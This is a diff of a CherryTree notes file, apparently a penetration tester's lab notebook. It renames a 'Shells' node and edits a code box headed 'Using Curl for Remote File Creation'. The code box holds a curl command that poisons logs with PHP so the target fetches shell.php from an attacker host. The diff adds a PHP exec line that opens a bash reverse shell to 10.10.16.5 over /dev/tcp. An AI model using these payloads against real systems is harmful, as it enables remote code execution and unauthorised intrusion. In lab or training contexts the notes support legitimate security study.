@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="8" master_id="0" name="Shells" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="1" foreground="#c061cb" ts_creation="1712707213" ts_lastsave="1712710443">
+  <node unique_id="8" master_id="0" name="PHP Shells" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="1" foreground="#241f31" ts_creation="1712707213" ts_lastsave="1712712371">
     <rich_text>
 </rich_text>
     <rich_text scale="h1" foreground="#cdab8f" weight="heavy">Shells Section: Using Curl for Remote File Creation</rich_text>
@@ -43,8 +43,9 @@ bash
 
 
 </rich_text>
-    <codebox char_offset="744" justification="left" frame_width="90" frame_height="100" width_in_pixels="0" syntax_highlighting="php" highlight_brackets="1" show_line_numbers="0">
-curl -A “&lt;?php file_put_contents('shell.php', file_get_contents('http://{ATTACKER_IP}/shell.php')); ?&gt;" -s http://{MACHINE_IP}
-</codebox>
+    <codebox char_offset="744" justification="left" frame_width="90" frame_height="100" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+curl -A “&lt;?php file_put_contents('shell.php', file_get_contents('http://{ATTACKER_IP}/shell.php')); ?&gt;" -s http://{MACHINE_IP};
+
+exec("/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.16.5/1235 0&gt;&amp;1'");</codebox>
   </node>
 </cherrytree>
